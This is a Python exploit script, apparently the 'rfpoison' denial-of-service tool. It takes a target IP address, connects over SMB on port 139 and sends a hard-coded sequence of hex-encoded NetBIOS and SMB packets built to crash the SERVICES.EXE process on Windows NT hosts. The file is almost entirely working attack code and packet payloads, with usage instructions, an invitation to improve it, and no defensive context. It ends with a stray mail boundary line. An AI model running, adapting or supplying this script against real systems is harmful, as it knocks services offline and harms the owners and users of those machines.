#!/usr/bin/env python
#
# Services.exe DoS
# hard work done by: rfp@wiretrip.net
# Python hack by: nas@adler.dynodns.net
#
# This only seems to work on NT.  Also, it may have to be run multiple times
# before SERVICES.EXE will die.  Improvements welcome.
#
# Usage: rfpoison.py <ip address>

import string
import struct
from socket import *
import sys

def a2b(s):
    bytes = map(lambda x: string.atoi(x, 16), string.split(s))
    data = string.join(map(chr, bytes), '')
    return data

def b2a(s):
    bytes = map(lambda x: '%.2x' % x, map(ord, s))
    return string.join(bytes, ' ')

# NBSS session request
nbss_session = a2b("""
    81 00  00 48 20 43 4b 46 44 45
    4e 45 43 46 44 45 46 46  43 46 47 45 46 46 43 43
    41 43 41 43 41 43 41 43  41 43 41 00 20 45 48 45
    42 46 45 45 46 45 4c 45  46 45 46 46 41 45 46 46
    43 43 41 43 41 43 41 43  41 43 41 41 41 00 00 00
    00 00
    """)

# SMB stuff
crud = (
    # SMBnegprot Request
    """
    ff 53 4d 42 72 00
    00 00 00 08 01 00 00 00  00 00 00 00 00 00 00 00
    00 00 00 00 f4 01 00 00  01 00 00 81 00 02 50 43
    20 4e 45 54 57 4f 52 4b  20 50 52 4f 47 52 41 4d
    20 31 2e 30 00 02 4d 49  43 52 4f 53 4f 46 54 20
    4e 45 54 57 4f 52 4b 53  20 31 2e 30 33 00 02 4d
    49 43 52 4f 53 4f 46 54  20 4e 45 54 57 4f 52 4b
    53 20 33 2e 30 00 02 4c  41 4e 4d 41 4e 31 2e 30
    00 02 4c 4d 31 2e 32 58  30 30 32 00 02 53 61 6d
    62 61 00 02 4e 54 20 4c  41 4e 4d 41 4e 20 31 2e
    30 00 02 4e 54 20 4c 4d  20 30 2e 31 32 00
    """,

    # SMBsessetupX Request
    """
    ff 53 4d 42 73 00
    00 00 00 08 01 00 00 00  00 00 00 00 00 00 00 00
    00 00 00 00 f4 01 00 00  01 00 0d ff 00 00 00 ff
    ff 02 00 f4 01 00 00 00  00 01 00 00 00 00 00 00
    00 00 00 00 00 17 00 00  00 57 4f 52 4b 47 52 4f
    55 50 00 55 6e 69 78 00  53 61 6d 62 61 00
    """,

    # SMBtconX Request
    """
    ff 53 4d 42 75 00
    00 00 00 08 01 00 00 00  00 00 00 00 00 00 00 00
    00 00 00 00 f4 01 00 08  01 00 04 ff 00 00 00 00
    00 01 00 17 00 00 5c 5c  2a 53 4d 42 53 45 52 56
    45 52 5c 49 50 43 24 00  49 50 43 00
    """,

    # SMBntcreateX request
    """
    ff 53 4d 42 a2 00
    00 00 00 08 01 00 00 00  00 00 00 00 00 00 00 00
    00 00 00 08 f4 01 00 08  01 00 18 ff 00 00 00 00
    07 00 06 00 00 00 00 00  00 00 9f 01 02 00 00 00
    00 00 00 00 00 00 00 00  00 00 03 00 00 00 01 00
    00 00 00 00 00 00 02 00  00 00 00 08 00 5c 73 72
    76 73 76 63 00
    """,

    # SMBtrans Request
    """
    ff 53 4d 42 25 00
    00 00 00 08 01 00 00 00  00 00 00 00 00 00 00 00
    00 00 00 08 f4 01 00 08  01 00 10 00 00 48 00 00
    00 48 00 00 00 00 00 00  00 00 00 00 00 00 00 4c
    00 48 00 4c 00 02 00 26  00 00 08 51 00 5c 50 49
    50 45 5c 00 00 00 05 00  0b 00 10 00 00 00 48 00
    00 00 01 00 00 00 30 16  30 16 00 00 00 00 01 00
    00 00 00 00 01 00 c8 4f  32 4b 70 16 d3 01 12 78
    5a 47 bf 6e e1 88 03 00  00 00 04 5d 88 8a eb 1c
    c9 11 9f e8 08 00 2b 10  48 60 02 00 00 00      
    """,

    # SMBtrans Request
    """
    ff 53 4d 42 25 00
    00 00 00 08 01 00 00 00  00 00 00 00 00 00 00 00
    00 00 00 08 f4 01 00 08  01 00 10 00 00 58 00 00
    00 58 00 00 00 00 00 00  00 00 00 00 00 00 00 4c
    00 58 00 4c 00 02 00 26  00 00 08 61 00 5c 50 49
    50 45 5c 00 00 00 05 00  00 03 10 00 00 00 58 00
    00 00 02 00 00 00 48 00  00 00 00 00 0f 00 01 00
    00 00 0d 00 00 00 00 00  00 00 0d 00 00 00 5c 00
    5c 00 2a 00 53 00 4d 00  42 00 53 00 45 00 52 00
    56 00 45 00 52 00 00 00  00 00 01 00 00 00 01 00
    00 00 00 00 00 00 ff ff  ff ff 00 00 00 00      
    """
)
crud = map(a2b, crud)


def smb_send(sock, data, type=0, flags=0):
    d = struct.pack('!BBH', type, flags, len(data))
    #print 'send:', b2a(d+data)
    sock.send(d+data)

def smb_recv(sock):
    s = sock.recv(4)
    assert(len(s) == 4)
    type, flags, length = struct.unpack('!BBH', s)
    data = sock.recv(length)
    assert(len(data) == length)
    #print 'recv:', b2a(s+data)
    return type, flags, data

def nbss_send(sock, data):
    sock.send(data)

def nbss_recv(sock):
    s =  sock.recv(4)
    assert(len(s) == 4)
    return s
    
def main(host, port=139):
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(host, port)
    nbss_send(s, nbss_session)
    nbss_recv(s)
    for msg in crud[:-1]:
        smb_send(s, msg)
        smb_recv(s)
    smb_send(s, crud[-1]) # no response to this
    s.close()

if __name__ == '__main__':
    print 'Sending poison...',
    main(sys.argv[1])
    print 'done.'

--82I3+IH0IqGh5yIs--
